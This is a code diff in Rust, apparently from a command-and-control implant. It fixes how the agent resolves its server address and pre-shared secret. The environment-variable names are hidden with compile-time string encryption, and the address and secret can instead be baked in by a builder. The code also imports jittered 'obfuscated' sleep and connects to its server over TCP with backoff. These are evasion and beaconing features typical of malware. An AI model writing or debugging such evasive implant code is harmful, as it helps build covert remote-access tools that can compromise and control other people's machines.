@@ -21,7 +21,7 @@ use log::{error, info, warn};
 use sysinfo::System;
 use tokio::net::TcpStream;
 use tokio::time::{sleep, Duration};
-use crate::obfuscated_sleep::{calculate_jittered_sleep, execute_sleep};
+use crate::obfuscated_sleep::calculate_jittered_sleep;
 use uuid::Uuid;
 
 // Compile-time constants injected by the Builder (may be absent in manual builds).
@@ -35,14 +35,24 @@ const MAX_BACKOFF_SECS: u64 = 64;
 /// Resolve the server address: runtime env var beats compile-time constant.
 pub fn resolve_addr() -> Option<String> {
     #[cfg(debug_assertions)]
-    if let Ok(v) = std::env::var(string_crypt::enc_str!("ORCHESTRA_C")) { return Some(v); }
+    {
+        // enc_str! returns [u8; N]; convert to &str before passing to env::var
+        // which requires AsRef<OsStr> (B-02 fix).
+        let raw = string_crypt::enc_str!("ORCHESTRA_C");
+        let key = std::str::from_utf8(&raw).unwrap_or("").trim_end_matches('\0');
+        if let Ok(v) = std::env::var(key) { return Some(v); }
+    }
     BAKED_ADDR.map(str::to_string)
 }
 
 /// Resolve the pre-shared secret: runtime env var beats compile-time constant.
 pub fn resolve_secret() -> Option<String> {
     #[cfg(debug_assertions)]
-    if let Ok(v) = std::env::var(string_crypt::enc_str!("ORCHESTRA_SECRET")) { return Some(v); }
+    {
+        let raw = string_crypt::enc_str!("ORCHESTRA_SECRET");
+        let key = std::str::from_utf8(&raw).unwrap_or("").trim_end_matches('\0');
+        if let Ok(v) = std::env::var(key) { return Some(v); }
+    }
     BAKED_SECRET.map(str::to_string)
 }
 
